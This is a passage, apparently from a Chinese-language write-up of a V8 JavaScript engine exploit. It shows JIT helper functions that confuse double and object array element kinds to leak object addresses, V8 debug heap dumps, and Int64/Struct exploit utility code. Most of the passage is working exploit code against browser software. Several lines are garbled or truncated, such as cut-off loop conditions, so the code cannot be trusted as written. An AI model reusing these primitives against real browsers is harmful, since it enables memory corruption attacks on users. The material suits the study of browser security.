            if(x = 'p4nda'){index = 4;}
            return [arr[index],arr,arr_ele];
        }
        function get_map(){
            var tmp ;
            for(var i = 0; i [FastProperties]
     - prototype: 0x2e535e811859 
     - elements: 0x39d386b0b421  [PACKED_ELEMENTS]
     - length: 2
     - properties: 0x1c1fd9680c21  {
        #length: 0x2c68462c01a9  (const accessor descriptor)
     }
     - elements: 0x39d386b0b421  {
               0: 0x39d386b0b3e1 
               1: 0x39d386b0b401 
     }
    DebugPrint: 0x39d386b0b441: [JSArray]
     - map: 0x2bd1746c3069  [FastProperties]
     - prototype: 0x2e535e811859 
     - elements: 0x39d386b0b421  [PACKED_ELEMENTS]
     - length: 2
     - properties: 0x1c1fd9680c21  {
        #length: 0x2c68462c01a9  (const accessor descriptor)
     }
     - elements: 0x39d386b0b421  {
               0: 0x2e535e81f8a9 
               1: 0x39d386b0b401 
     }
因此需要做一下转换，对一个写满`double_map`的`JSArray`(`PACKED_DOUBLE_ELEMEMTS`类型)造类型混淆，使其混淆为`PACKED_ELEMENT`类型，这样再去其中的一个变量向`PACKED_ELEMENT`类型的`JSArray`写入，即可将其混淆为`PACKED_DOUBLE_ELEMENT`类型，从而读出其中`object`的地址。
    function prepare_double_map_opt(x){
            let arr = [double_map,double_map,double_map,double_map];
            let index = 0;
            if(x = 'p4nda'){index = 4;}
            arr[index] = element_map;
            return arr;
        }
        function prepare_double_map(){
            var tmp;
            for (var i = 0; i 8)
                parts.splice(8, 0, ' ');
            lines.push(parts.join(' '));
        }
        return lines.join('\n');
    }
    // Simplified version of the similarly named python module.
    var Struct = (function() {
        // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
        var buffer      = new ArrayBuffer(8);
        var byteView    = new Uint8Array(buffer);
        var uint32View  = new Uint32Array(buffer);
        var float64View = new Float64Array(buffer);
        return {
            pack: function(type, value) {
                var view = type;        // See below
                view[0] = value;
                return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
            },
            unpack: function(type, bytes) {
                if (bytes.length !== type.BYTES_PER_ELEMENT)
                    throw Error("Invalid bytearray");
                var view = type;        // See below
                byteView.set(bytes);
                return view[0];
            },
            // Available types.
            int8:    byteView,
            int32:   uint32View,
            float64: float64View
        };
    })();
    //
    // Tiny module that provides big (64bit) integers.
    //
    // Copyright (c) 2016 Samuel Groß
    //
    // Requires utils.js
    //
    // Datatype to represent 64-bit integers.
    //
    // Internally, the integer is stored as a Uint8Array in little endian byte order.
    function Int64(v) {
        // The underlying byte array.
        var bytes = new Uint8Array(8);
        switch (typeof v) {
            case 'number':
                v = '0x' + Math.floor(v).toString(16);
            case 'string':
                if (v.startsWith('0x'))
                    v = v.substr(2);
                if (v.length % 2 == 1)
                    v = '0' + v;
                var bigEndian = unhexlify(v, 8);
                bytes.set(Array.from(bigEndian).reverse());
                break;
            case 'object':
                if (v instanceof Int64) {
                    bytes.set(v.bytes());
                } else {
                    if (v.length != 8)
                        throw TypeError("Array must have excactly 8 elements.");
                    bytes.set(v);
                }
                break;
            case 'undefined':
                break;